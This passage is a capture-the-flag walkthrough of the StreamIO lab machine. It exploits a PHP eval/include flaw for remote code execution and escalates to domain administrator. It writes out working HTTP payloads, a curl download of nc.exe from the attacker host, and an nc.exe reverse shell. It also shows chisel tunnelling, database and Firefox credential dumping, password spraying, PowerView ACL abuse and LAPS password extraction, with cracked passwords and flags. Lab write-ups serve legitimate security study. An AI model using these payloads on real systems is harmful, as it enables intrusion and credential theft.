$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

Let’s start by split the code and analyze it part by part, first the file that we just found **master.php** if we access into it we’ll get the error of the first lines of the code:

```php
<?php
if(!defined('included'))
	die("Only accessable through includes");
```

![[Pasted image 20220709034711.png]]

This give us a hint about what is missing, there is a parameter called includes, by reviewing deep down the code we can see that in first place the HTTP request must be POST and then by taking a look to the last part of the code, it seems that there is a tag called “include” which is hidden and also a conditional for it:

```php
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
	if($_POST['include'] !== "index.php" ) 
		eval(file_get_contents($_POST['include']));
	else
		echo(" ---- ERROR ---- ");
}
?>
```

By searching about this include and file_get_contents we can find a very interesting paper about php wrappers and how an LFI can be converted into an RCE (for further details see the resources section) this is a little piece of the paper:

```php
How can you use the wrapper, which takes the input from the _POST_ Request Body and sends it to the PHP compiler, in exploiting an RFI vulnerability?

Here is a sample request:

POST http://www.example.com?go=php://input%00 HTTP/1.1
Host: example.comContent-Length: 30

<?php system($_GET["cmd"]); ?>
```

So let’s try to adapt this into our initial request, as we can see there is no response from the server, this could be because of the if conditional:

![[Pasted image 20220709034722.png]]

Initial request:

```php
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=b4l3qrn1urotb80r5qbsvmrpge
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

<%3fphp+system($_GET["cmd"])%3b+%3f>
```

As we scroll down onto the paper, we’ll see that there is a section that explains, how wrappers can be used onto the payload for a POST request by using wrappers:

![[Pasted image 20220709034731.png]]

If we try to apply such payload on our request we get the following error message: ^56bdc2

![[Pasted image 20220709034740.png]]

Request:

```php
POST /admin/master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=b4l3qrn1urotb80r5qbsvmrpge
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Length: 46

data://text/plain, <?php system($_GET["cmd"]);
```

This means that includes must be part of the request, also remember that in order to execute an RCE under an URL we need to add the “&cmd=” at the end and pass a command, in any case no further content has been displayed:

![[Pasted image 20220709034751.png]]

Request: ^2912d9

```php
POST /admin/?debug=master.php&cmd=dir HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=b4l3qrn1urotb80r5qbsvmrpge
Content-Length: 60

include=data%3a//text/plain,+<%3fphp+system($_GET["cmd"])%3b
```

Let’s now try by encoding with base64 encoder as this is raw code and characters like “;” could be giving us troubles, for that we use base64 wrapper:

![[Pasted image 20220709034805.png]]

And finally we are able to execute commands:

![[Pasted image 20220709034815.png]]

Final payload: ^6f66d1

```php
POST /admin/?debug=master.php&cmd=dir HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=b4l3qrn1urotb80r5qbsvmrpge
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWyJjbWQiXSk7
```

# Exploitation

As we can execute commands then let’s proceed to get a reverse shell.

Let’s see if this machine has curl command by sending the following request (curl 2>&1):

```php
POST /admin/?debug=master.php&cmd=curl+2>%261 HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=b4l3qrn1urotb80r5qbsvmrpge
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWyJjbWQiXSk7
```

Second, let’s upload a nc.exe within the system, first let’s start a python server on our machine:

```php
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (<http://0.0.0.0:80/>) ...
```

We create the following payload to get the nc.exe onto the system: ^40a776

```php
POST /admin/?debug=master.php&cmd=curl+http%3a//10.10.16.4/nc.exe+-o+nc.exe HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=b4l3qrn1urotb80r5qbsvmrpge
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWyJjbWQiXSk7
```

And then with a “dir” we can see that the executable is effectively uploaded:

![[Pasted image 20220709034841.png]]

Then we need to run the nc.exe and send the reverse shell to our machine, don’t forget to open the port on your local machine:

```php
nc -lvnp 1234
```

Payload:

```php
POST /admin/?debug=master.php&cmd=nc.exe+-e+cmd+10.10.16.4+1234 HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=b4l3qrn1urotb80r5qbsvmrpge
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWyJjbWQiXSk7
```

And we got access as user yoshihide:

```bash
nc -lvnp 1234
Connection from 10.10.11.158:54796
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\inetpub\\streamio.htb\\admin>whoami
streamio\\yoshihide

C:\\inetpub\\streamio.htb\\admin
```

## User privesc

If we remember, we previously found some credentials for a database but no database open port was exposed externally, so we proceed to enumerate internally: ^1d2840

```bash
C:\\inetpub\\streamio.htb\\admin>netstat -ano -p tcp
netstat -ano -p tcp

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       884
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       884
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       620
  **TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3828**
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2628
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       480
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1128
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1552
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       612
  TCP    0.0.0.0:49696          0.0.0.0:0              LISTENING       3020
  TCP    0.0.0.0:54497          0.0.0.0:0              LISTENING       2956
  TCP    10.10.11.158:53        0.0.0.0:0              LISTENING       3020
  TCP    10.10.11.158:139       0.0.0.0:0              LISTENING       4
  TCP    10.10.11.158:443       10.10.16.4:41478       ESTABLISHED     4
  TCP    10.10.11.158:52757     10.10.16.4:1234        ESTABLISHED     1436
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       3020
```

As we can see there is an open port which is related with the database, but as it is not directly exposed, we need to somehow forward it to our machine, for this we’ll use the chisel utility (for further details please go to resources section).

First we need to upload the windows chisel utility by running python server on our machine and download it with curl on the victim machine:

On our machine:

```bash
sudo python3 -m http.server 80
```

On Victim machine:

```bash
curl http://10.10.16.4/chiselWin.exe -o chisel.exe
```

Then we proceed to configure both client and server in order to forward the port 1433 to our machine:

Chisel client (Windows): ^b193f4

```bash
.\\chisel.exe client 10.10.16.4:1337 R:1433:localhost:1433
```

Chisel server (our machine): ^c5cdca

```bash
./chisel_1.7.7_linux_amd64 server --port 1337 --reverse
```

After we have the port of the database reachable on our machine, we can then access with the credentials we got before:

```bash
**db_admin:B1@hx31234567890**
```

We can use the **[mssql.py](http://mssql.py)** utility to access into the database: ^2bc6f1

```bash
mssqlclient.py db_admin@127.0.0.1 -p 1433
```

Then we can enumerate the databases with following commands:

```bash
# Show databases available
select name from sys.databases
# It also works for the same but as a store procedure
sp_databases

# Result:
master                                                                                                                             
tempdb                                                                                                                             
model                                                                                                                              
msdb                                                                                                                               
STREAMIO                                                                                                                           
streamio_backup
```

Then we can extract info from any DB by first selecting it and then listing it:

```sql
SQL> use streamio_backup
[*] ENVCHANGE(DATABASE): Old Value: STREAMIO, New Value: streamio_backup
[*] INFO(DC): Line 1: Changed database context to 'streamio_backup'.
SQL> select * from users;
     id   username                            password                                             

------   -----------------   --------------------------------------------------   

     1   nikk37                              389d14cb8e4e9b94b137deb1caf0612a                     
     2   yoshihide                           b779ba15cedfd22a023c4d8bcf5f2332                     
     3   James                               c660060492d9edcaa8332d89c99c9239                     
     4   Theodore                            925e5408ecb67aea449373d668b7359e                     
     5   Samantha                            083ffae904143c4796e464dac33c1f7d                     
     6   Lauren                              08344b85b329d7efd611b7a7743e8a09                     
     7   William                             d62be0dc82071bccc1322d64ec5b6c51                     
     8   Sabrina                             f87d3c0d6c8fd686aacc6627f1f493a5
```

As we are already user yoshihide and the other user with a folder within the system is nikk37 then let’s crack the hash of its password by using crackstation:

```
nikk37:get_dem_girls2@yahoo.com
```

Execute evil-winrm as port tcp 5985 is open: ^963d06

```
evil-winrm -i 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\\Users\\nikk37\\Documents>
```

## Root privesc

After enumerate the whole machine, we found that there are some cached information about the session from firefox: ^9a4b0a

```powershell
*Evil-WinRM* PS C:\\Users\\nikk37\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\br53rxeg.default-release> dir

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                bookmarkbackups
d-----        2/22/2022   2:40 AM                browser-extension-data
d-----        2/22/2022   2:41 AM                crashes
d-----        2/22/2022   2:42 AM                datareporting
d-----        2/22/2022   2:40 AM                minidumps
d-----        2/22/2022   2:42 AM                saved-telemetry-pings
d-----        2/22/2022   2:40 AM                security_state
d-----        2/22/2022   2:42 AM                sessionstore-backups
d-----        2/22/2022   2:40 AM                storage
-a----        2/22/2022   2:40 AM             24 addons.json
-a----        2/22/2022   2:42 AM           5189 addonStartup.json.lz4
-a----        2/22/2022   2:42 AM            310 AlternateServices.txt
-a----        2/22/2022   2:41 AM         229376 cert9.db
-a----        2/22/2022   2:40 AM            208 compatibility.ini
-a----        2/22/2022   2:40 AM            939 containers.json
-a----        2/22/2022   2:40 AM         229376 content-prefs.sqlite
-a----        2/22/2022   2:40 AM          98304 cookies.sqlite
-a----        2/22/2022   2:40 AM           1081 extension-preferences.json
-a----        2/22/2022   2:40 AM          43726 extensions.json
-a----        2/22/2022   2:42 AM        5242880 favicons.sqlite
-a----        2/22/2022   2:41 AM         262144 formhistory.sqlite
-a----        2/22/2022   2:40 AM            778 handlers.json
**-a----        2/22/2022   2:40 AM         294912 key4.db**
-a----        2/22/2022   2:41 AM           1593 logins-backup.json
**-a----        2/22/2022   2:41 AM           2081 logins.json**
-a----        2/22/2022   2:42 AM              0 parent.lock
-a----        2/22/2022   2:42 AM          98304 permissions.sqlite
-a----        2/22/2022   2:40 AM            506 pkcs11.txt
-a----        2/22/2022   2:42 AM        5242880 places.sqlite
-a----        2/22/2022   2:42 AM           8040 prefs.js
-a----        2/22/2022   2:42 AM            180 search.json.mozlz4
-a----        2/22/2022   2:42 AM            288 sessionCheckpoints.json
-a----        2/22/2022   2:42 AM           1853 sessionstore.jsonlz4
-a----        2/22/2022   2:40 AM             18 shield-preference-experiments.json
-a----        2/22/2022   2:42 AM            611 SiteSecurityServiceState.txt
-a----        2/22/2022   2:42 AM           4096 storage.sqlite
-a----        2/22/2022   2:40 AM             50 times.json
-a----        2/22/2022   2:40 AM          98304 webappsstore.sqlite
-a----        2/22/2022   2:42 AM            141 xulstore.json
```

There is a technique where passwords can be retrieved if we have key4.db and logins.json, so after download them we then execute the utility firepwd (see resources) which help us to decrypt this 2 files:

```python
python3 firepwd.py key4.db logins.json
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
<https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3>@t0r'
<https://slack.streamio.htb>:b'nikk37',b'n1kk1sd0p3t00:)'
<https://slack.streamio.htb:b'yoshihide',b'paddpadd@12>'
<https://slack.streamio.htb:b'JDgodd',b'password@12>'
```

To escalate privileges and as we are on Active Directory environment, we can run Bloodhound to enumerate possible escalation vectors, by using following commands: ^35be6e

First we need to upload Sharphound.ps1 into the machine, we can run evil-winrm to do so:

```bash
# Evil-winrm
upload /home/user/StreamIO/SharpHound.ps1 C:\\Windows\\Temp\\privesc\\SharpHound.ps1
# Alternative way with curl
curl http://10.10.16.4/SharpHound.ps1 -o SharpHound.ps1
```
Then we need to load the powershell modules into the system (each line is a command):
```powershell
Powershell -exec bypass
Import-module SharpHound.ps1
Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default
```
We’ll receive some files, what we’re interested in is the .zip file, then we download the file with evil-winrm:

```powershell
*Evil-WinRM* PS C:\\Users\\nikk37\\Documents> download "C:/Users/nikk37/Documents/20220709052541_BloodHound.zip" /home/shuciran/Documents/HTB/StreamIO/content/bloodhound.zip
```

Unzip the file and we got some json files that we need to load into the bloodhound utility, select all of them: ^94f9d1

![[Pasted image 20220709034912.png]]

By clicking on the user and configure it as owned we can retrieve only information that we are able to login within the DC, but in order to escalate privileges we will need to abuse of another account according with bloodhound JDgodd user can be a member of Core_Staff group and abuse of a functionality called ReadLAPSPassword:

![[Pasted image 20220709034921.png]]

According with the info panel this are the commands that we need to run, but first we need to upload powerview.ps1 onto the machine and import it:

```powershell
*Evil-WinRM* PS C:\\Windows\\Temp\\privesc> upload /usr/share/privesc/PowerView.ps1
Info: Uploading /usr/share/privesc/PowerView.ps1 to C:\\Windows\\Temp\\privesc\\PowerView.ps1                                                             
Data: 1027036 bytes of 1027036 bytes copied
Info: Upload successful!
*Evil-WinRM* PS C:\\Windows\\Temp\\privesc> dir

    Directory: C:\\Windows\\Temp\\privesc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         7/9/2022   6:35 AM         770279 PowerView.ps1

*Evil-WinRM* PS C:\\Windows\\Temp\\privesc> Import-module "C:/Windows/Temp/privesc/PowerView.ps1"
```

Help panel bloodhound:

![[Pasted image 20220709034933.png]]

Because we don’t know which credentials will be used for this attack and as this is an LDAP attack type we first need to enumerate which credentials are valid via LDAP and with which user, as we already know JDGodd is the most probable user, by doing a password spraying attack we can confirm: ^676765

```powershell
crackmapexec ldap 10.10.11.158 -u users -p creds --continue-on-success
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\\JDgodd:B1@hx3123456789 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\\JDgodd:66boysandgirls.. 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\\JDgodd:get_dem_girls2@yahoo.com 
**LDAP        10.10.11.158    389    DC               [+] streamIO.htb\\JDgodd:JDg0dd1s@d0p3cr3@t0r** 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\JDgodd:n1kk1sd0p3t00:) 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\JDgodd:paddpadd@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\JDgodd:password@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\db_admin:B1@hx3123456789 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\db_admin:66boysandgirls.. 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\db_admin:get_dem_girls2@yahoo.com 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\db_admin:JDg0dd1s@d0p3cr3@t0r 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\db_admin:n1kk1sd0p3t00:) 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\db_admin:paddpadd@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\db_admin:password@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:B1@hx3123456789 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:66boysandgirls.. 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:get_dem_girls2@yahoo.com 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:JDg0dd1s@d0p3cr3@t0r 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:n1kk1sd0p3t00:) 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:paddpadd@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:password@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:B1@hx3123456789 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:66boysandgirls.. 
**LDAP        10.10.11.158    389    DC               [+] streamIO.htb\\nikk37:get_dem_girls2@yahoo.com** 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:JDg0dd1s@d0p3cr3@t0r 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:n1kk1sd0p3t00:) 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:paddpadd@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:password@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\admin:B1@hx3123456789 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\admin:66boysandgirls.. 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\admin:get_dem_girls2@yahoo.com 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\admin:JDg0dd1s@d0p3cr3@t0r 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\admin:n1kk1sd0p3t00:) 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\admin:paddpadd@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\admin:password@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:B1@hx3123456789 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:66boysandgirls.. 
**LDAP        10.10.11.158    389    DC               [+] streamIO.htb\\nikk37:get_dem_girls2@yahoo.com** 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:JDg0dd1s@d0p3cr3@t0r 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:n1kk1sd0p3t00:) 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:paddpadd@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\nikk37:password@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:B1@hx3123456789 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:66boysandgirls.. 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:get_dem_girls2@yahoo.com 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:JDg0dd1s@d0p3cr3@t0r 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:n1kk1sd0p3t00:) 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:paddpadd@12 
LDAP        10.10.11.158    389    DC               [-] streamIO.htb\\yoshihide:password@12
```

Then we need to execute the following commands, which will make JDgodd user a member of Core Staff group which then can abuse of ReadLAPSPassword: ^dc6ecc

```powershell
Import-Module ./PowerView.ps1
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio\\JDgodd', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -principalidentity "streamio\\JDgodd"
Add-DomainGroupMember -Identity 'Core Staff' -Members 'streamio\\JDgodd' -Credential $Cred
net group 'Core Staff'
```

In order to abuse of this feature we need an utility called **[LAPSDumper.py](http://LAPSDumper.py)** for which we then can read passwords, a brief explanation about what is LAPS and how can we abuse of it is under resources section, this is the command to abuse of it also the link for the utility: ^2cc182

```python
python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb
LAPS Dumper - Running at 07-07-2022 13:57:05
DC &V@%DQ-wEwQ97A
```

After that we receive the password from DC and we are able to login as Administrator: ^bef5fd

```python
evil-winrm -i 10.10.11.158 -u 'Administrator' -p '&V@%DQ-wEwQ97A'
Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>
```

For some reason, the flag of root is under Martin’s folder:

```python
*Evil-WinRM* PS C:\\Users\\Martin\\Desktop> dir
    Directory: C:\\Users\\Martin\\Desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/9/2022   4:52 AM             34 root.txt
```

# Notes

-   While fuzzing make sure that you search by changes on lines or even characters, this can help to improve the results, as an example, we couldn’t identify the parameter debug within the admin web page because we were using a fuzz by lines on the response:

```bash
wfuzz -c -t 200 --hl 49 --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 'PHPSESSID=b4l3qrn1urotb80r5qbsvmrpge' -u <https://streamio.htb/admin/\\?FUZZ=>
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: <https://streamio.htb/admin/?FUZZ=>
Total requests: 220549

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                
=====================================================================

000000114:   200        62 L     160 W      2073 Ch     "user"                                                                 
000000234:   200        398 L    916 W      12484 Ch    "staff"                                                                
000001050:   200        10790    25878 W    320235 Ch   "movie"
```

-   But if we use a search by words or by chars, this helps us to find the tiny changes under a web page, there was only a few words that were being added:

![[Pasted image 20220709034951.png]]

# Useful Commands:

Command to identify if we have a powershell or command prompt shell.

```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

# Resources:

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/papers/45870)

[reverse shell windows](https://deephacking.tech/reverse-shells-en-windows/)

[https://deephacking.tech/reverse-shells-en-windows/](https://deephacking.tech/reverse-shells-en-windows/)

[Release v1.7.7 · jpillora/chisel](https://github.com/jpillora/chisel/releases/tag/v1.7.7)

[GitHub - lclevy/firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwords](https://github.com/lclevy/firepwd)

[BloodHound/SharpHound.ps1 at master · BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)

[PowerSploit/PowerView.ps1 at master · PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

[Powershell powerview commands](https://chryzsh.gitbooks.io/darthsidious/content/other/war-stories/domain-admin-in-30-minutes.html)

[LAPS explanation](https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/)


# Flags

user.txt

e58bf31a6f718b76b25761940252326a

root.txt

2cc34866191fabf6a5f3474c2979a48f